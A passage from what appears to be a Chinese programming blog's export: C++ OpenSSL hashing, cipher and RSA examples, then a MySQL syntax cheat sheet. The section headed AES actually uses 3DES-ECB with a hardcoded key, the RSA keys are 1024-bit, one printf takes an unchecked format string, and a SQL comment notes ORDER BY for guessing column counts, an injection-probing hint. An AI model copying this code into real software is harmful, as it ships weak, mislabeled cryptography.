class="keyword">void</span>* data, <span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">char</span>* md5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 初始化保存 md5 信息的结构体</span></span><br><span class="line">MD5_CTX ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">MD5_Init(&amp;ctx);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将需要计算的数据传入到对应的结构中</span></span><br><span class="line">MD5_Update(&amp;ctx, data, len);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从结构中获取计算后的结果</span></span><br><span class="line">MD5_Final(md5, &amp;ctx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sha1_encrypt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* data, <span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">char</span>* md5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">SHA_CTX ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">SHA1_Init(&amp;ctx);</span><br><span class="line">SHA1_Update(&amp;ctx, data, len);</span><br><span class="line">SHA1_Final(md5, &amp;ctx);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sha256_encrypt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* data, <span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">char</span>* md5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">SHA256_CTX ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">SHA256_Init(&amp;ctx);</span><br><span class="line">SHA256_Update(&amp;ctx, data, len);</span><br><span class="line">SHA256_Final(md5, &amp;ctx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_hex</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* n, <span class="keyword">unsigned</span> <span class="keyword">char</span>* hex, <span class="keyword">size_t</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(n);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; ++i)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, hex[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> hex[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">md5_encrypt(<span class="string">&quot;hello15pb&quot;</span>, <span class="number">9</span>, hex);</span><br><span class="line">show_hex(<span class="string">&quot;md5: &quot;</span>, hex, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">sha1_encrypt(<span class="string">&quot;hello15pb&quot;</span>, <span class="number">9</span>, hex);</span><br><span class="line">show_hex(<span class="string">&quot;sha1: &quot;</span>, hex, <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">sha256_encrypt(<span class="string">&quot;hello15pb&quot;</span>, <span class="number">9</span>, hex);</span><br><span class="line">show_hex(<span class="string">&quot;sha256: &quot;</span>, hex, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/evp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;libcrypto.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回值是加密后的密文长度，传入明文，明文长度和保存密文的缓冲区</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evp_en_cipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* source_string, <span class="keyword">unsigned</span> <span class="keyword">char</span>* des_string, <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 创建一个通用加解密的对象，设置填充方式</span></span><br><span class="line">EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();</span><br><span class="line">EVP_CIPHER_CTX_set_padding(ctx, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// once_length 是一次加密的长度, out_length 加密后密文的长度 </span></span><br><span class="line"><span class="keyword">int</span> once_length = <span class="number">0</span>, out_length = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置加密时使用的算法+分组模式和 key，函数的倒数第二个参数可以</span></span><br><span class="line"><span class="comment">// 用于指定初始化向量，最后一个参数是 1 表示加密，否则解密</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[<span class="number">16</span>] = <span class="string">&quot;15pb&quot;</span>;</span><br><span class="line">EVP_CipherInit_ex(ctx, EVP_des_ede3_ecb(), <span class="literal">NULL</span>, key, <span class="literal">nullptr</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 EVP_CipherUpdate + EVP_CipherFinal 完成整个加密</span></span><br><span class="line">EVP_CipherUpdate(ctx, des_string, &amp;once_length, source_string, length);</span><br><span class="line">out_length += once_length;</span><br><span class="line">EVP_CipherFinal(ctx, des_string + once_length, &amp;once_length);</span><br><span class="line">out_length += once_length;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清理对象并返回长度</span></span><br><span class="line">EVP_CIPHER_CTX_free(ctx);</span><br><span class="line"><span class="keyword">return</span> out_length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evp_de_cipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* source_string, <span class="keyword">unsigned</span> <span class="keyword">char</span>* des_string, <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">EVP_CIPHER_CTX * ctx = EVP_CIPHER_CTX_new();</span><br><span class="line">EVP_CIPHER_CTX_set_padding(ctx, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> once_length = <span class="number">0</span>, out_length = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密的代码和加密除 EVP_CipherInit_ex 的最后一个参数外基本相同</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[<span class="number">16</span>] = <span class="string">&quot;15pb&quot;</span>;</span><br><span class="line">EVP_CipherInit_ex(ctx, EVP_des_ede3_ecb(), <span class="literal">NULL</span>, key, <span class="literal">nullptr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">EVP_CipherUpdate(ctx, des_string, &amp;once_length, source_string, length);</span><br><span class="line">out_length += once_length;</span><br><span class="line">EVP_CipherFinal(ctx, des_string + once_length, &amp;once_length);</span><br><span class="line">out_length += once_length;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为加密后的数据添加空字符</span></span><br><span class="line">des_string[out_length] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">EVP_CIPHER_CTX_free(ctx);</span><br><span class="line"><span class="keyword">return</span> out_length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> planttext[] =</span><br><span class="line"><span class="string">&quot;123456789123456789&quot;</span></span><br><span class="line"><span class="string">&quot;123456789123456789&quot;</span></span><br><span class="line"><span class="string">&quot;123456789123456789&quot;</span></span><br><span class="line"><span class="string">&quot;123456789123456789&quot;</span></span><br><span class="line"><span class="string">&quot;123456789123456789&quot;</span></span><br><span class="line"><span class="string">&quot;123456789123456789&quot;</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> temp_string[<span class="number">1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> en_length = evp_en_cipher(planttext, temp_string, <span class="number">108</span>);</span><br><span class="line"><span class="keyword">int</span> de_length = evp_de_cipher(temp_string, temp_string, en_length);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, temp_string);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl\rsa.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl\pem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl\rand.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl\applink.c&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;libcrypto.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUB_KEY_FILE <span class="meta-string">&quot;pubkey.pem&quot;</span>    <span class="comment">// 公钥路径  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRI_KEY_FILE <span class="meta-string">&quot;prikey.pem&quot;</span>    <span class="comment">// 私钥路径  </span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数方法生成密钥对   </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">generate_rsa_key</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 生成 rsa 密钥对, 参数一密钥长度，参数二公钥指数 e，参数三四可以不指定 </span></span><br><span class="line">RSA* keypair = RSA_generate_key(<span class="number">1024</span>, RSA_F4, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从生成的密钥对中读取私钥到内存对象</span></span><br><span class="line">BIO* pri = BIO_new(BIO_s_mem());</span><br><span class="line">PEM_write_bio_RSAPrivateKey(pri, keypair, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 获取密钥长度并且申请空间进行保存</span></span><br><span class="line"><span class="keyword">size_t</span> pri_len = BIO_pending(pri);</span><br><span class="line"><span class="keyword">char</span>* pri_key = (<span class="keyword">char</span>*)<span class="built_in">calloc</span>(pri_len + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">BIO_read(pri, pri_key, pri_len);</span><br><span class="line"><span class="comment">// 将生成的私钥写入到指定的文件中</span></span><br><span class="line">FILE* private_file = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">if</span> (fopen_s(&amp;private_file, PRI_KEY_FILE, <span class="string">&quot;w&quot;</span>) == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pri_key &amp;&amp; private_file)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fputs</span>(pri_key, private_file);</span><br><span class="line">fclose(private_file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BIO* pub = BIO_new(BIO_s_mem());</span><br><span class="line">PEM_write_bio_RSAPublicKey(pub, keypair);</span><br><span class="line"><span class="keyword">size_t</span> pub_len = BIO_pending(pub);</span><br><span class="line"><span class="keyword">char</span>* pub_key = (<span class="keyword">char</span>*)<span class="built_in">calloc</span>(pub_len + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">BIO_read(pub, pub_key, pub_len);</span><br><span class="line">FILE* public_file = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">if</span> (fopen_s(&amp;public_file, PUB_KEY_FILE, <span class="string">&quot;w&quot;</span>) == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pub_key &amp;&amp; public_file)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fputs</span>(pub_key, public_file);</span><br><span class="line">fclose(public_file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放对应的资源，防止泄露</span></span><br><span class="line">RSA_free(keypair);</span><br><span class="line">BIO_free_all(pub);</span><br><span class="line">BIO_free_all(pri);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(pri_key);</span><br><span class="line"><span class="built_in">free</span>(pub_key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*加密最大长度为加密长度-41*/</span></span><br><span class="line"><span class="function">RSA*  <span class="title">get_public_key</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 打开公钥文件</span></span><br><span class="line">FILE* public_file = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">if</span> (fopen_s(&amp;public_file, PUB_KEY_FILE, <span class="string">&quot;r&quot;</span>) == <span class="literal">NULL</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 从指定文件中读取公钥</span></span><br><span class="line">RSA* rsa = PEM_read_RSAPublicKey(public_file, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(public_file) fclose(public_file);</span><br><span class="line"><span class="keyword">return</span> rsa;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">RSA* <span class="title">get_private_key</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 打开私钥文件</span></span><br><span class="line">FILE* private_file = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">if</span> (fopen_s(&amp;private_file, PRI_KEY_FILE, <span class="string">&quot;r&quot;</span>) == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 从指定文件中读取公钥</span></span><br><span class="line">RSA* rsa = PEM_read_RSAPrivateKey(private_file, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (private_file) fclose(private_file);</span><br><span class="line"><span class="keyword">return</span> rsa;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BYTE* <span class="title">rsa_encrypt</span><span class="params">(BYTE* data, RSA* rsa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> rsa_len = RSA_size(rsa);</span><br><span class="line">BYTE* encrypt = (BYTE*)<span class="built_in">malloc</span>(rsa_len);</span><br><span class="line">RSA_public_encrypt(<span class="number">117</span>, data, encrypt, rsa, RSA_PKCS1_PADDING);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> encrypt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密数据，</span></span><br><span class="line"><span class="function">BYTE* <span class="title">rsa_decrypt</span><span class="params">(BYTE* data, RSA* rsa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> rsa_len = RSA_size(rsa);</span><br><span class="line">BYTE* decrypt = (BYTE*)<span class="built_in">malloc</span>(rsa_len);</span><br><span class="line">RSA_private_decrypt(rsa_len, data, decrypt, rsa, RSA_PKCS1_PADDING);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> decrypt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 生成 rsa 密钥对并读取到 rsa 对象中</span></span><br><span class="line">generate_rsa_key();</span><br><span class="line">RSA* public_key = get_public_key();</span><br><span class="line">RSA* private_key = get_private_key();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建需要加密的文件</span></span><br><span class="line">BYTE plaintext[<span class="number">117</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">memset</span>(plaintext, <span class="string">&#x27;a&#x27;</span>, <span class="number">117</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密和解密</span></span><br><span class="line">BYTE* encrypt = rsa_encrypt(plaintext, public_key);</span><br><span class="line">BYTE* decrypt = rsa_decrypt(encrypt, private_key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Openssl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql————常用语法</title>
      <link href="2020/12/05/mysql%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/"/>
      <url>2020/12/05/mysql%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h1><p>– 如果指定的数据库不存在，就创建并设置默认的字符集以及排序方式<br>CREATE DATABASE IF NOT EXISTS db_name CHARACTER SET utf8 COLLATE utf8_general_ci;</p><p>– 显示当前存在的所有数据库<br>SHOW DATABASES;</p><p>– 查看数据库的创建形式(编码)<br>SHOW CREATE DATABASE db_name;</p><p>– 修改数据的字符编码<br>ALTER DATABASE db_name CHARACTER SET utf8;</p><p>– 如果数据库存在，则删除<br>DROP DATABASE IF EXISTS db_name;</p><p>– 应用数据库，指定 SQL 语句影响的是谁<br>USE db_name;</p><h1 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h1><p>– 创建表，创建的时候必须指定列<br>CREATE TABLE stu_info(<br>    info_id INT,<br>    info_name VARCHAR(20),<br>    info_sex BOOL,<br>    info_class VARCHAR(20),<br>    info_date DATETIME<br>) CHARACTER SET utf8 COLLATE utf8_general_ci;</p><p>– 查看表的字段信息(名称，类型，约束)<br>DESC stu_info;</p><p>– 显示指定数据库下的所有表<br>SHOW TABLES</p><p>– 显示表创建语句<br>SHOW CREATE TABLE table_name;</p><p>– 删除表<br>DROP TABLE table_name;</p><h1 id="添加与修改字段"><a href="#添加与修改字段" class="headerlink" title="添加与修改字段"></a>添加与修改字段</h1><p>– 在指定表的结尾添加新的字段<br>ALTER TABLE table_name ADD column_name INT;</p><p>– 在指定表的开始添加新的字段<br>ALTER TABLE table_name ADD column_name INT FIRST;</p><p>– 在指定表的某列之后添加新的字段<br>ALTER TABLE table_name ADD column_name2 INT AFTER column_name;</p><p>– 修改指定表中字段的类型<br>ALTER TABLE table_name MODIFY column_name2 CHAR;</p><p>– 修改指定表中字段的类型和名称<br>ALTER TABLE table_name CHANGE column_name2 column_name2_new VARCHAR(30);</p><p>– 删除指定表中的字段<br>ALTER TABLE table_name DROP column_name;</p><p>– 向目标表中的所有字段添加一条记录<br>INSERT INTO stu_info VALUE(1, “小明”, ‘男’, ‘一班’, “2002/10/1”);</p><p>– 向目标表中的指定字段添加一条记录<br>INSERT INTO stu_info(info_name, info_class, info_date) VALUE( “小刚”, ‘二班’, now());</p><p>– 向目标表中的所有字段添加多条记录<br>INSERT INTO stu_info VALUES<br>    (1, “中白”, ‘男’, ‘一班’, “2002/1/1”),<br>    (2, “小青”, ‘男’, ‘二班’, “2003/4/1”),<br>    (3, “大红”, ‘保密’, ‘一班’, “2022/1/1”),<br>    (4, “小黄”, ‘女’, ‘二班’, “1999/1/1”),<br>    (5, “中绿”, ‘女’, ‘一班’, “2222/1/1”),<br>    (6, “小黑”, ‘保密’, ‘二班’, “2989/1/1”),<br>    (7, “中紫”, ‘男’, ‘三班’, “1002/1/1”);</p><p>– 更新所有记录中指定字段的值<br>UPDATE stu_info SET info_sex=’女’;</p><p>– 带条件的更新符合条件的记录中指定字段的值<br>UPDATE stu_info SET info_sex=’男’ WHERE info_name=”小黄”;</p><p>– 删除满足条件的记录<br>DELETE FROM stu_info WHERE info_name=’小黄’;</p><p>– 删除所有的记录<br>DELETE FROM stu_info;</p><p>– 以存在约束的形式创建一张表<br>CREATE TABLE stu_info(<br>    – 将 id 设置为主键(非空且唯一)，并且自增<br>    info_id INT PRIMARY KEY AUTO_INCREMENT,<br>    – 唯一且非空的名字<br>    info_name VARCHAR(32) UNIQUE NOT NULL,<br>    – 由于 mysql 没有检查约束，可以使用 ENUM 替代<br>    info_sex ENUM(‘男’,’女’,’保密’) DEFAULT ‘保密’,<br>    – 班级设置为另外一个表的主键(添加的时候必须是存在)<br>    info_class INT NOT NULL,<br>    – 生日，默认可以为空<br>    info_day DATE DEFAULT NULL<br>);</p><p>– 需要被添加外键的表<br>CREATE TABLE stu_class(<br>    class_id INT PRIMARY KEY AUTO_INCREMENT,<br>    class_name VARCHAR(32) NOT NULL<br>);</p><p>– 为指定表中的字段添加外键为另一张表的指定字段，在添加外键的时候必须保证通过外键关联的两个字段的类型完全相同<br>ALTER TABLE stu_info ADD FOREIGN KEY(info_class) REFERENCES stu_class(class_id);</p><p>INSERT INTO stu_class(class_name) VALUES<br>    (‘一班!!!!’), (‘二班!!!!’), (‘三班!!!!’);</p><p>INSERT INTO stu_info(info_name, info_sex, info_class, info_day) VALUES<br>    (“中白”, ‘男’, 1, “2002/1/1”),<br>    (“小青”, ‘男’, 3, “2003/4/1”),<br>    (“大红”, ‘保密’, 2, “2022/1/1”),<br>    (“小黄”, ‘女’, 2, “1999/1/1”),<br>    (“中绿”, ‘女’, 1, “2222/1/1”),<br>    (“小黑”, ‘保密’, 2, “2989/1/1”),<br>    (“中紫”, ‘男’, 3, “1002/1/1”);</p><h1 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h1><p>– 查询一张表中的所有字段<br>SELECT * FROM stu_info;</p><p>– 查询一张表中的指定字段<br>SELECT info_name FROM stu_info;</p><p>– 对查询的内容进行去重<br>SELECT DISTINCT info_class FROM stu_info;</p><p>– 对查询到的内容进行运算<br>SELECT info_score*0.6 FROM stu_info;</p><p>– 为查询到的列设置别名<br>SELECT info_score*0.6 as 成绩 FROM stu_info;</p><p>– 带比较运算符的查询<br>SELECT info_name FROM stu_info WHERE info_class&gt;1;</p><p>– 搜索某一个区间内内容<br>SELECT info_name, info_class FROM stu_info WHERE info_class BETWEEN 1 AND 2;</p><p>– 搜索在指定集合内的数据<br>SELECT info_name, info_class FROM stu_info WHERE info_class IN(1, 3);</p><p>– 使用字符串的模糊查询 %(任意长度的任意字符) _(单个任意字符)<br>SELECT * FROM stu_info WHERE info_day LIKE “____-01-01”;</p><p>– 带有多个条件的查询语句<br> SELECT * FROM stu_info WHERE info_sex=’女’ and info_name LIKE “xiao %”;</p><p>– 通过 ORDER BY 可以以指定列的顺序对结果进行排序，可以用于猜测字段的数量<br>SELECT * FROM stu_info ORDER BY 6 DESC(ASC);</p><h2 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h2><p>– 内置函数的使用: COUNT 求查询结果的数量<br>SELECT COUNT(*) FROM stu_info;</p><p>– 内置函数的使用: MIN\MAX 求查询结果的最大\最小值<br>SELECT COUNT(info_score) FROM stu_info;</p><p>– 内置函数的使用: NOW 获取当前的时间<br>SELECT NOW();   </p><p>– 内置函数的使用: DM5 计算 MD5<br>SELECT MD5(‘123’);</p><h2 id="联合查询"><a href="#联合查询" class="headerlink" 